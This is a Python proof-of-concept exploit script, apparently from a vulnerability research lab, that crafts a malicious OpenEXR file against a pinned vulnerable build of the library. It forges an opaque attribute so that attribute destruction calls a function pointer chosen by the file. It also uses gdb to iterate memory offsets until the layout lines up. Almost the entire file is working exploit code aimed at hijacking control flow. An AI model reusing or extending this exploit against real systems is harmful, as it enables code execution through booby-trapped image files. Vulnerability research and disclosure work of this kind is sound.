#!/usr/bin/env python3
"""W197: make attr_destroy reach a *file-chosen indirect call target*.

Starts from the W195 pre-COPY2 source dump (unmodified 3.5.2 layout) and
writes a fake exr_attribute_t of type EXR_ATTR_OPAQUE (31) into COPY2's
fully-chosen window.  attr_destroy() calls exr_attr_opaquedata_destroy(),
which invokes ud->destroy_unpacked_func_ptr at opaque.c:79 -- a function
pointer stored *in the attribute*, not ctxt->free_fn as in W196.

The chosen target is the address of exr_attr_string_destroy in the pinned
vuln build with ASLR off; the chosen unpacked_data is a fake exr_attr_string_t
whose str pointer is another chosen address, so the indirect call both
executes a file-chosen address and consumes file-chosen data.

Frame size and attribute-list placement move with content, so the driver
iterates until the measured destination and entries[0] slot offset match.
Every pointer and the code address come from the EXR; gdb only sets
breakpoints.
"""
import re
import struct
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
LAB = HERE.parent
BASE = LAB / "work-w192/baseline.exr"
OUT = LAB / "cases/p197-chosen-ip.exr"
DUMP = HERE / "w195-pre-copy2-dump.bin"
N, U, BYTE = 768, 3072, 0x5A
ATTR_OFF, OPAQUE_OFF, STRUCT_OFF, STR_OFF = 1152, 1216, 1280, 1328
# 0x555555661b30 = &exr_attr_string_destroy, ASLR off in the debuggee.
TARGET = 0x555555661B30


def build(dest, slot_off):
    d = bytearray(DUMP.read_bytes())
    assert len(d) == 2 * N
    attr_addr = dest + ATTR_OFF
    opaque_addr = dest + OPAQUE_OFF
    struct_addr = dest + STRUCT_OFF
    str_addr = dest + STR_OFF

    d[slot_off:slot_off + 8] = struct.pack("<Q", attr_addr)
    d[ATTR_OFF + 20:ATTR_OFF + 24] = struct.pack("<I", 31)  # EXR_ATTR_OPAQUE
    d[ATTR_OFF + 24:ATTR_OFF + 32] = struct.pack("<Q", opaque_addr)

    # exr_attr_opaquedata_t
    d[OPAQUE_OFF + 0:OPAQUE_OFF + 4] = struct.pack("<i", 0)      # size
    d[OPAQUE_OFF + 4:OPAQUE_OFF + 8] = struct.pack("<i", 90)     # unpacked_size
    d[OPAQUE_OFF + 8:OPAQUE_OFF + 16] = struct.pack("<II", 0, 0)  # packed alloc
    d[OPAQUE_OFF + 16:OPAQUE_OFF + 24] = struct.pack("<Q", 0)    # packed_data
    d[OPAQUE_OFF + 24:OPAQUE_OFF + 32] = struct.pack("<Q", struct_addr)
    d[OPAQUE_OFF + 32:OPAQUE_OFF + 48] = bytes(16)              # unpack/pack
    d[OPAQUE_OFF + 48:OPAQUE_OFF + 56] = struct.pack("<Q", TARGET)

    # exr_attr_string_t consumed by the chosen target
    d[STRUCT_OFF + 0:STRUCT_OFF + 4] = struct.pack("<i", 0x5A)
    d[STRUCT_OFF + 4:STRUCT_OFF + 8] = struct.pack("<i", 1)
    d[STRUCT_OFF + 8:STRUCT_OFF + 16] = struct.pack("<Q", str_addr)
    d[STR_OFF - 8:STR_OFF] = struct.pack("<Q", 0x91)
    d[STR_OFF:STR_OFF + 16] = bytes([BYTE]) * 16

    seg1 = bytes(d[0::2] + d[1::2])
    gen = subprocess.run(
        [sys.executable, str(HERE / "make_poc_mixed_full.py"), str(BASE),
         str(OUT), str(N), hex(BYTE), str(U), seg1.hex()],
        cwd=LAB, capture_output=True, text=True, check=True)
    return seg1, gen.stdout


def measure():
    cmd = ["gdb", "-q", "-batch",
           "-ex", "set args -c cases/p197-chosen-ip.exr",
           "-ex", "set disable-randomization on",
           "-ex", "break sort2_4ByteChannels_tiled", "-ex", "run",
           "-ex", 'printf "SINK_OUT=%p\\n", outPtr',
           "-ex", "break attributes.c:305", "-ex", "continue",
           "-ex", 'printf "SLOT0_ADDR=%p\\n", &list->entries[0]',
           "-ex", "quit",
           "./build-vuln-plain/bin/exrcheck"]
    r = subprocess.run(cmd, cwd=LAB, capture_output=True, text=True)
    text = r.stdout + r.stderr
    m1 = re.search(r"SINK_OUT=(0x[0-9a-f]+)", text)
    m2 = re.search(r"SLOT0_ADDR=(0x[0-9a-f]+)", text)
    if not m1 or not m2:
        print(text[-2000:])
        raise SystemExit("no layout measurement")
    dest = int(m1.group(1), 16) + 4 * N
    return dest, int(m2.group(1), 16) - dest


def main():
    dest = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x555555828090
    slot_off = int(sys.argv[2]) if len(sys.argv) > 2 else 1104
    for i in range(10):
        _, out = build(dest, slot_off)
        actual_dest, actual_slot = measure()
        print(f"iter {i}: dest {dest:#x}/{actual_dest:#x} "
              f"slot {slot_off}/{actual_slot} "
              f"frame={re.search(r'frame=(\d+)', out).group(1)}")
        if actual_dest == dest and actual_slot == slot_off:
            print(f"FIXPOINT dest={dest:#x} slot={slot_off} "
                  f"attr={dest+ATTR_OFF:#x} opaque={dest+OPAQUE_OFF:#x} "
                  f"string={dest+STRUCT_OFF:#x} target={TARGET:#x}")
            sha = subprocess.run(["sha256sum", str(OUT)], capture_output=True,
                                 text=True).stdout.split()[0]
            print(f"poc_sha256={sha}")
            return 0
        dest, slot_off = actual_dest, actual_slot
    raise SystemExit("no fixed point in 10 iterations")


if __name__ == "__main__":
    raise SystemExit(main())
